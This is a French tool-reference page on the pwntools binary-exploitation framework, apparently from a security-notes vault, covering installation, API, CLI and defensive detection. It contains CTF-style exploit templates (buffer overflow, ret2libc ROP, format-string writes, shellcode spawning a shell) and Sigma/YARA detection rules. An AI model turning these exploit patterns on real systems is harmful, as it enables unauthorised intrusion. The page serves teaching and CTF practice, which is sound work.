---
title: "Outil - pwntools"
type: outil
categorie: 🎯 CTF & Développement
tags:
  - cyber
  - outil
  - ctf
statut: publie
version: 4.15.0
licence: MIT / GPL / BSD (composants)
langage: Python
developpeur: Gallopsled
repo: https://github.com/Gallopsled/pwntools
site: https://pwntools.com
doc: https://docs.pwntools.com
---

# 🎯 pwntools — Le framework d'exploitation pwn en Python

> [!info] **En 1 phrase**
> La boîte à outils Python ultime pour construire des payloads, interagir avec des binaires et automatiser l'exploitation de vulnérabilités.

---

## 🧾 Overview

| Champ | Valeur |
|---|---|
| Nom complet | pwntools |
| Description | Framework Python pour le pwn : I/O local/remote, fabrication de payloads, ELF, ROP, assembly/désassemblage, debug GDB intégré |
| Catégorie | CTF & Développement |
| Sous-catégorie | Exploitation / Reverse Engineering |
| Fonction principale | Automatiser l'interaction avec des binaires et construire des exploits |
| Type d'outil | Bibliothèque Python + CLI (`pwn`) |
| Licence | MIT / GPL / BSD (selon les modules) |
| Open source / propriétaire | Open source |
| Langage(s) de programmation | Python (2.7, 3.8+) |
| Développeur / organisation | Gallopsled (équipe CTF) |
| Projet officiel | Gallopsled/pwntools |
| Dépôt officiel | https://github.com/Gallopsled/pwntools |
| Documentation officielle | https://docs.pwntools.com |
| État du projet | actif (maintenu) |
| Dernière version connue | 4.15.0 |
| Systèmes compatibles | Linux (Ubuntu LTS recommandé), macOS, WSL ; cibles x86/x64/ARM/MIPS... |

> [!note] À vérifier
> pwntools vise principalement **Ubuntu LTS** et est testé sur les architectures courantes ; sous Windows natif, utiliser WSL. La doc officielle (docs.pwntools.com) reste la référence des API.

---

## 🎯 Concept

pwntools est un framework Python spécialement conçu pour le pwn (exploitation de binaires) en CTF. Il encapsule tout le travail pénible : interaction avec les processus locaux et distants, fabrication de payloads (`p32`, `p64`), calcul d'adresses avec `ELF()`, assembly/désassemblage, ROP chains automatiques, et analyse de protection (`checksec`). On écrit un script d'exploit en Python et pwntools gère l'I/O, les encodages et les logiques de debug (gdb attaché). C'est l'outil indispensable pour les challenges de type buffer overflow, format string ou ROP. Il s'accompagne de la commande `pwn` (CLI) qui fournit `checksec`, `cyclic`, `asm`, `disasm`, `hex`, etc.

Dans un workflow pwn, pwntools se place à toutes les étapes : **analyse** (checksec), **reverse** (`pwn asm`/`disasm`), **développement** (`process`/`remote`, `cyclic`, `ELF`, `ROP`) et **debug** (`gdb.attach`). C'est le compagnon naturel de [[Outil - gdb-peda]] (debug) et de [[Outil - ROPgadget]] (gadgets), avec lesquels il compose l'arsenal pwn standard.

```mermaid
flowchart LR
    A["Binaire cible"] --> B["pwn checksec"]
    B --> C["cyclic / pattern"]
    C --> D["ELF() / ROP()"]
    D --> E["process() / remote()"]
    E --> F["send / recv / interactive"]
    F --> G["gdb.attach"]
```

---

## 🧠 Concepts fondamentaux

| Concept | Explication |
|---|---|
| `p32()` / `p64()` | Empaqueter un entier en little-endian 4/8 octets (`u32`/`u64` pour dépaqueter) |
| `process()` / `remote()` | Lancer un processus local ou se connecter à un hôte distant |
| `ELF()` | Représentation du binaire : symboles, sections, adresses, PLT/GOT |
| `ROP()` | Construction automatique de ROP chains depuis les gadgets du binaire |
| `cyclic(n)` | Motif cyclique pour trouver l'offset (complément de `pattern search`) |
| `context` | Configuration globale : `arch`, `os`, `log_level`, `endian`, `bits` |
| `gdb.attach()` | Attacher GDB au processus pour déboguer l'exploit |
| `interactive()` | Basculer en mode interactif (send/recv manuel) |
| `shellcraft` | Générateur d'asm/shellcodes (`sh`, `execve`, `dup`) |
| `asm` / `disasm` | Assembler/désassembler en ligne de commande ou en script |
| Tube | Interface unifiée `process`/`remote`/`listen` avec `sendline`, `recvuntil`... |
| `log` | Journalisation colorée (`log.info`, `log.success`) |

---

## 🛠️ Installation

### Debian / Ubuntu / Kali Linux

```bash
sudo apt install python3-pip
python3 -m pip install --upgrade pip
python3 -m pip install --user pwntools
```

### Arch Linux

```bash
sudo pacman -S python-pwntools
```

### macOS / Homebrew

```bash
brew install python
pip install --user pwntools
```

### Depuis les sources

```bash
git clone https://github.com/Gallopsled/pwntools.git
cd pwntools
python3 setup.py install
```

### Vérification

```bash
pwn version
python3 -c "from pwn import *; print(context.arch)"
```

> [!warning] ⚠️ Prérequis & problèmes potentiels
> - **Ubuntu LTS recommandé** ; sous d'autres distributions, des dépendances système (binutils, gcc) sont requises.
> - Python 2 n'est plus supporté sur les versions récentes (Python 3.8+ requis).
> - WSL est nécessaire sous Windows natif ; certaines fonctionnalités (process local) sont limitées en WSL1.

---

## ⚙️ Configuration

| Paramètre | Rôle | Valeur possible | Impact | Exemple |
|---|---|---|---|---|
| `context.arch` | Architecture cible | `amd64`, `i386`, `arm`, `mips`... | Encodages, shellcraft | `context.arch='amd64'` |
| `context.bits` | Taille des pointeurs | `32`, `64` | `p32` vs `p64` | `context.bits=64` |
| `context.os` | Système cible | `linux`, `freebsd` | Systèmes d'appels | `context.os='linux'` |
| `context.log_level` | Niveau de log | `debug`, `info`, `error` | Verbosité | `context.log_level='debug'` |
| `context.endian` | Endianness | `little`, `big` | Empaquetage | `context.endian='little'` |
| `context.terminal` | Terminal pour gdb.attach | `['tmux','new-window']` | Ouvre GDB dans le bon terminal | `context.terminal=['tmux','new-window']` |
| `context.timeout` | Timeout des tubes | secondes | Évite les blocages | `context.timeout=5` |
| `context.noptrace` | Ne jamais tracer (ptrace) | True/False | Désactive gdb.attach | `context.noptrace=True` |

> [!note] À vérifier
> `context.terminal` dépend de l'éditeur/terminal de l'environnement (tmux, new-window, xterm...) : adapter au poste de travail.

---

## 🏗️ Architecture interne

- **Modules** : `pwnlib.tubes` (I/O), `pwnlib.elf` (ELF), `pwnlib.rop` (ROP), `pwnlib.asm`/`shellcraft`, `pwnlib.util` (packing, cyclic, misc), `pwnlib.gdb`.
- **Tubes** : abstraction unifiée `process`/`remote`/`listen`/`tube` — toutes les primitives d'I/O (`send`, `sendline`, `recv`, `recvuntil`, `recvall`) partagent la même interface.
- **Context global** : une seule variable `context` partagée contrôle l'arch, les bits, l'endianness — les primitives (`p64`, `cyclic`, `ROP`, `shellcraft`) s'y réfèrent automatiquement.
- **ELF parsing** : `ELF()` parse symboles, sections, PLT/GOT, bss, et expose `plt['system']`, `got['system']`, `symbols[...]`, `address`, `read`/`write` pour construire les adresses.
- **ROP engine** : `ROP(elf)` charge les gadgets (`pop rdi; ret`), `.find_gadget()` et `.call('system', ['/bin/sh'])` génèrent la chaîne.
- **shellcraft** : générateur d'assembleur ; `shellcraft.sh()` produit le shellcode, `asm()` l'assemble, `disasm()` le désassemble.

---

## ⌨️ Commandes

### Commandes principales (CLI `pwn`)

```bash
pwn checksec ./challenge
pwn cyclic 200
pwn asm "nop; ret"
pwn disasm "\x90\xc3"
pwn hex "payload"
pwn unhex 666c61677b
```

| Commande CLI | Objectif | Résultat attendu |
|---|---|---|
| `pwn checksec` | Protections d'un binaire | NX, PIE, canary, RELRO |
| `pwn cyclic` | Générer un motif cyclique | Chaîne de test |
| `pwn asm` | Assembler des instructions | Octets |
| `pwn disasm` | Désassembler des octets | Instructions |
| `pwn hex` / `pwn unhex` | Encoder/décoder hex | Chaîne |
| `pwn shellcraft` | Générer des shellcodes | Assembler avec `-r` |

---

## 🎚️ Options et flags| API / paramètre | Description | Exemple | Niveau |
|---|---|---|---|
| `p32()` / `p64()` | Packing little-endian | `p64(0x401234)` | Basic |
| `u32()` / `u64()` | Unpacking | `u64(b"A"*8)` | Basic |
| `process()` | Processus local | `process(['./challenge'])` | Basic |
| `remote(host, port)` | Connexion distante | `remote('10.10.20.15', 1337)` | Basic |
| `sendline` / `recvuntil` | I/O tube | `p.recvuntil(b"> ")` | Basic |
| `interactive()` | Mode interactif | `p.interactive()` | Basic |
| `cyclic(300)` | Motif cyclique | `cyclic(300)` | Intermediate |
| `cyclic_find(b'aaaa')` | Trouver l'offset | `cyclic_find(p32(0x61616161))` | Intermediate |
| `ELF(file)` | Objet ELF | `e = ELF('./challenge')` | Intermediate |
| `ROP(e)` | ROP chain | `rop.call('system', ['/bin/sh'])` | Advanced |
| `gdb.attach(p)` | Attacher GDB | `gdb.attach(p)` | Advanced |
| `shellcraft.sh()` | Shellcode | `asm(shellcraft.sh())` | Advanced |
| `log.info(...)` | Journalisation | `log.success("shell!")` | Basic |

> [!tip] Options les plus utiles au quotidien
> `context.log_level='debug'` (voir tout), `gdb.attach` (debug), `ROP()` (chaîne automatique), `cyclic_find` (offset), `remote`/`process` (tubes), `shellcraft` (shellcode).

---

## 🧪 Exemples pratiques

### Beginner

```python
# Objectif : overflow simple
from pwn import *
p = process("./challenge")
p.sendline(b"A"*72 + p64(0x401234))
p.interactive()
```

```python
# Objectif : récupérer un flag distant
from pwn import *
p = remote("10.10.20.15", 1337)
flag = p.recvall()
print(flag)
```

### Intermediate

```python
# Objectif : trouver l'offset avec cyclic
from pwn import *
p = process("./challenge")
p.sendline(cyclic(300))
p.wait()                     # attend le crash
core = p.corefile            # analyser le core
offset = cyclic_find(core.fault_addr)
log.info(f"offset = {offset}")
```

### Advanced

```python
# Objectif : ret2libc via ROP
from pwn import *
context.binary = e = ELF("./challenge")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(e)
rop.call("puts", [e.got["puts"]])        # leak
rop.call("main")                          # revenir
p = process("./challenge")
p.sendline(b"A"*72 + rop.chain())
leak = u64(p.recvline()[:6].ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
```

### Expert

```python
# Objectif : format string arbitraire (écriture)
from pwn import *
p = process("./challenge")
payload = fmtstr_payload(6, {0x404000: 0x1337})
p.sendline(payload)
p.interactive()
```

---

## 🧪 Workflow complet (scénario pas à pas)

1. **Étape 1 — Analyser les protections** :
   ```bash
   pwn checksec ./challenge
   ```
2. **Étape 2 — Trouver l'offset** (local, avec cyclic + core) :
   ```python
   from pwn import *
   p = process("./challenge")
   p.sendline(cyclic(300))
   p.wait(); offset = cyclic_find(p.corefile.fault_addr)
   ```
3. **Étape 3 — Identifier les fonctions/adresses utiles** :
   ```python
   e = ELF("./challenge")
   win = e.symbols["win"]          # ex. 0x401234
   ```
4. **Étape 4 — Construire le payload** :
   ```python
   payload = b"A"*offset + p64(win)
   ```
5. **Étape 5 — Tester en local puis passer au remote** :
   ```python
   p = remote("10.10.20.15", 1337)
   p.sendline(payload)
   p.interactive()
   ```
6. **Étape 6 — Déboguer si échec** avec `gdb.attach` et ajuster (bad bytes, PIE, canary).

---

## 🎬 Scénarios avancés

### Scénario 2 : format string pour leak d'adresses

```python
from pwn import *
p = process("./challenge")
p.sendline(b"%6$p.%7$p")
leaks = p.recvline().split(b".")
canary = int(leaks[0], 16)
log.success(hex(canary))
```

### Scénario 3 : shellcode direct (NX off)

```python
from pwn import *
context.arch = "amd64"
p = process("./challenge")
payload = b"\x90"*offset + asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
```

---

## 🛡️ Cybersecurity use cases

| Phase | Utilisation |
|---|---|
| Analyse | `checksec`, ELF parsing, désassemblage |
| Développement d'exploit | Payloads, ROP, format string, shellcodes |
| Test d'exploitabilité | `cyclic` + core, `gdb.attach`, debug pas à pas |
| Remote | Automatisation d'exploitation sur cibles distantes |
| Évaluation / pentest | POC d'exploitation, rapport |
| CTF / pwn | Tous les challenges d'exploitation binaire |

---

## 🎯 MITRE ATT&CK

| Tactique | Technique / Sub-technique | ID | Raison | Détection | Mitigation |
|---|---|---|---|---|---|
| Execution | Native API | T1106 | Exploitation via appels système/libc construits par pwntools | EDR, supervision syscalls | Moindre privilège, CFI |
| Defense Evasion | Obfuscated Files or Information | T1027 | Payloads/shellcodes encodés pour éviter les signatures | Analyse mémoire, sandbox | NX/ASLR/PIE, WAF (web) |
| Execution | Command and Scripting Interpreter : Python | T1059.006 | Scripts d'exploitation en Python | Détection d'exécutions Python anormales | Restriction interpréteurs |
| Impact | Exploitation for Privilege Escalation | T1068 | Exploitation de vulnérabilités mémoire (overflow/ROP) | EDR, monitoring crash | Patching, durcissement |

> [!note] Ne renseigner que si l'association est réellement pertinente.
> pwntools est le **vecteur** d'exploitation (T1059.006/T1106) ; les protections ciblées (NX, ASLR, canary) correspondent aux mitigations MITRE (T1068).

---

## 🛡️ Defensive Security

### Signes observables

| Indicateur | Détail |
|---|---|
| Scripts Python utilisant `pwn`/`from pwn import *` | Développement d'exploit |
| Connexions vers des ports non standard en boucle | Automatisation d'attaque |
| Exécutions `ptrace`/attach GDB | Debug d'exploit en cours |
| Core dumps fréquents d'un même binaire | Tentatives de crash/exploit |

### Règles de détection (Sigma / Suricata / Snort / YARA)

```yaml
# Sigma — exécution de scripts Python contenant pwntools
title: Pwntools Python Exploit Script
id: a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d
status: experimental
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|endswith: '/python3'
        CommandLine|contains:
            - 'pwn'
            - 'from pwn import'
    condition: selection
falsepositives:
    - Legitimate CTF and research activities
level: medium
```

```yaml
# YARA — détecter les signatures de scripts pwntools
rule pwntools_import
{
    strings:
        $a = "from pwn import"
        $b = "shellcraft"
        $c = "p64("
    condition:
        $a and ($b or $c)
}
```

> [!note] À vérifier
> Règles pédagogiques à adapter ; les motifs Python restent faciles à obfusquer.

---

## 🤖 Automatisation

```python
# Automatisation : bruteforce d'un offset sur plusieurs runs
from pwn import *
for n in range(64, 128, 4):
    try:
        p = process("./challenge")
        p.sendline(b"A"*n + p64(0x401234))
        out = p.recvall(timeout=1)
        if b"flag{" in out:
            log.success(f"offset {n} OK")
            break
    except Exception:
        pass
```

```bash
# Pipeline : checksec + cyclic dans un script bash
pwn checksec ./challenge
pwn cyclic 300 | ./challenge
```

---

## 📤 Output et parsing

```python
# Parsing d'un flag retourné par la cible
from pwn import *
import re
p = remote("10.10.20.15", 1337)
data = p.recvall(timeout=5)
m = re.search(rb"[Ff]lag\{[^}]+\}", data)
print(m.group() if m else "no flag")
```

```python
# Extraction d'une adresse dans une sortie format string
from pwn import *
p = process("./challenge")
p.sendline(b"%11$p")
addr = int(p.recvline().strip().split(b"[")[1].split(b"]")[0], 16)
log.info(hex(addr))
```

```bash
# Décoder des données reçues (hex)
pwn unhex 666c61677b...
```

---

## 🔗 Intégrations

```text
checksec (pwntools) → ROPgadget (gadgets) → ROP() (chaîne) → gdb.attach (debug)
→ CyberChef (décodage des données) → rapport
```

- [[Tools|🧰 Outils]]
- [[Outil - gdb-peda]] — debug interactif attaché au processus
- [[Outil - ROPgadget]] — gadgets complémentaires pour ROP()
- [[Outil - Ghidra]] — reverse statique du binaire cible
- [[Outil - radare2]] — analyse et debug alternatifs
- [[Outil - CyberChef]] — décodage des sorties/encodages récoltés
- [[10 - Cheatsheets|📋 Cheatsheets]]

---

## 🔄 Alternatives

| Outil | Avantages | Inconvénients | Cas d'usage |
|---|---|---|---|
| `angr` | Exécution symbolique, très puissant | Lourd, complexe | Reverse automatique |
| `Ropper` | Gadgets + ROP en CLI | Moins d'I/O | Construction ROP |
| `ropgadget` (CLI) | Simple, exhaustif gadgets | Pas d'I/O | Gadgets |
| `capstone`/`keystone` | Assemble/désassemble léger | Pas d'exploit | Analyse |
| `pwntools` | Tout-en-un, standard CTF | Python requis | Exploitation |
| GDB + scripts | Debug fin | Long à écrire | Analyse fine |

> **Quand utiliser angr plutôt que pwntools ?** Pour l'exploration de chemins d'exécution (résolution de contraintes) sans construire manuellement l'exploit ; pwntools reste la base pour envoyer, recevoir et finaliser.

---

## ⚡ Performance

- **Rapide** : les tubes et primitives sont légers ; le goulot est l'I/O réseau/processus.
- **ROP()** : le scan des gadgets de la libc prend quelques secondes la première fois ; la chaîne générée est directe.
- **cyclique** : `cyclic`/`cyclic_find` sont O(n), adaptés aux grosses tailles.
- **debug** : `context.log_level='debug'` peut ralentir les échanges ; l'activer seulement si nécessaire.
- **Multi-cibles** : scripts parallélisables (threads/tubes) mais attention aux ressources.

> [!note] À vérifier
> Les performances dépendent du matériel et du réseau ; pwntools n'a pas de benchmark officiel.

---

## 🛠️ Troubleshooting

### Common problems

#### Problème : `ModuleNotFoundError: pwn`

- **Cause** : pwntools non installé ou mauvais environnement.
- **Solution** : `pip install --user pwntools` ; vérifier `pwn version`. **Vérif** : `python3 -c "from pwn import *"`.

#### Problème : `gdb.attach` ne s'ouvre pas

- **Cause** : `context.terminal` non configuré ou GDB absent.
- **Solution** : `context.terminal=['tmux','new-window']` et installer GDB. **Vérif** : tester `gdb --version`.

#### Problème : offset `cyclic_find` incorrect

- **Cause** : mauvaise endianness ou motif tronqué.
- **Solution** : utiliser `cyclic_find(core.fault_addr)` ou `p32(cyclic_find(...))` selon le contexte. **Vérif** : imprimer l'offset et tester.

#### Problème : connexion `remote` timeout

- **Cause** : réseau/firewall ou la cible n'écoute pas.
- **Solution** : `context.timeout=10`, vérifier `nc -vz <host> <port>`. **Vérif** : `remote(...).sendline(b"")`.

---
## 🔐 Sécurité de l'outil

- **Exécution locale** : pwntools lance des processus locaux et peut attach GDB — exécuter dans un environnement contrôlé (VM).
- **Shellcodes générés** : `shellcraft.sh()` produit du code arbitraire ; ne pas exécuter sur des machines sensibles.
- **Trafic réseau** : les sessions `remote` sont en clair par défaut ; pour des POC sur des réseaux autorisés uniquement.
- **Dépendances** : auditer les paquets installés (`pip audit`) en environnement de confiance.

---

## ⚠️ Limitations

- **Python uniquement** : nécessite un environnement Python 3.8+.
- **Plateforme** : Windows natif non supporté (WSL recommandé).
- **Protections** : pwntools facilite l'exploitation mais ne « casse » pas les protections au sens crypto ; le contournement (leak canary, PIE) reste du travail d'analyse.
- **Émulation** : pas d'exécution symbolique intégrée (voir angr).
- **CLI limitée** : la CLI `pwn` est pratique mais les fonctionnalités complètes passent par l'API Python.

---

## 📋 Cheatsheet

```python
# Setup
from pwn import *
context.arch = "amd64"; context.log_level = "info"

# I/O
p = process("./challenge")            # local
p = remote("10.10.20.15", 1337)       # distant
p.sendline(b"A"*72 + p64(0x401234))
p.recvuntil(b"> ")
p.interactive()

# Offset
offset = cyclic_find(p.corefile.fault_addr)

# ELF / adresses
e = ELF("./challenge")
e.symbols["win"]; e.plt["system"]; e.got["puts"]

# ROP
rop = ROP(e)
rop.call("system", ["/bin/sh"])
payload = b"A"*offset + rop.chain()

# Debug
gdb.attach(p)

# Shellcode
asm(shellcraft.sh())
```

---

## ⚡ Quick reference

| | |
|---|---|
| **À quoi sert-il ?** | Automatiser l'exploitation de binaires (I/O, payloads, ROP) |
| **Quand l'utiliser ?** | Dès qu'un exploit binaire doit être écrit et testé |
| **Commande principale** | `pwn checksec` puis script `from pwn import *` |
| **Alternative principale** | angr, ROPgadget+CLI, GDB |
| **Concepts importants** | p64, process/remote, ELF, ROP, cyclic, gdb.attach, shellcraft |
| **Liens associés** | [[Outil - gdb-peda]] · [[Outil - ROPgadget]] · [[Outil - Ghidra]] |

---

## 🔍 Détection & Défense

| Signe | Défense |
|---|---|
| Scripts Python avec `from pwn import` | Supervision des exécutions Python |
| Connexions répétées vers ports inconnus | Détection réseau (IDPS) |
| `ptrace` sur processus applicatifs | Durcir `ptrace_scope`, EDR |
| Core dumps d'un même binaire | Analyse des crashs, patching |

---

## ⚠️ Tips & Pièges

> [!tip] 💡 **Tips**
> - Configurez `context.binary = e` pour que pwntools aligne automatiquement arch/bits.
> - `context.log_level='debug'` montre tout l'I/O : indispensable pour déboguer.
> - `cyclic_find(p.corefile.fault_addr)` donne l'offset sans chercher manuellement.
> - `gdb.attach(p)` au bon endroit (avant `sendline`) pour voir l'état exact.
> - `pwn shellcraft -r` assemble et exécute directement un shellcode en test.

> [!warning] ⚠️ **Pièges**
> - Oublier l'endianness : `p64` sur un binaire 32 bits casse tout (`p32` requis).
> - Un `remote` sans `context.timeout` peut bloquer indéfiniment.
> - PIE : les adresses absolues changent ; penser au leak et à `e.address`.
> - Ne pas confondre `send` (sans newline) et `sendline` (avec `\n`) selon le binaire.
> - `process()` et `gdb.attach` nécessitent un environnement sans restrictions ptrace.

---

## 📚 References

### Official

- Dépôt officiel : https://github.com/Gallopsled/pwntools
- Documentation officielle : https://docs.pwntools.com
- Site du projet : https://pwntools.com
- Releases : https://github.com/Gallopsled/pwntools/releases

### Security references

- MITRE ATT&CK T1106 — Native API : https://attack.mitre.org/techniques/T1106/
- MITRE ATT&CK T1027 — Obfuscated Files or Information : https://attack.mitre.org/techniques/T1027/
- MITRE ATT&CK T1059.006 — Python : https://attack.mitre.org/techniques/T1059/006/
- MITRE ATT&CK T1068 — Exploitation for Privilege Escalation : https://attack.mitre.org/techniques/T1068/

### Community

- HackTricks — pwn : https://book.hacktricks.xyz/reversing-and-exploiting
- CTF 101 — pwn : https://ctf101.org/binary-exploitation/
- Gallopsled CTF : https://github.com/Gallopsled

---

➡️ **Liens :** [[Tools|🧰 Outils]] · [[Outil - gdb-peda|🛠️ gdb-peda]] · [[Outil - ROPgadget|🧩 ROPgadget]] · [[Outil - Ghidra|🔬 Ghidra]] · [[Outil - radare2|🕵️ radare2]] · [[Outil - CyberChef|🧪 CyberChef]] · [[Outil - hashcat|⚡ hashcat]] · [[Outil - John the Ripper|🔓 John the Ripper]]
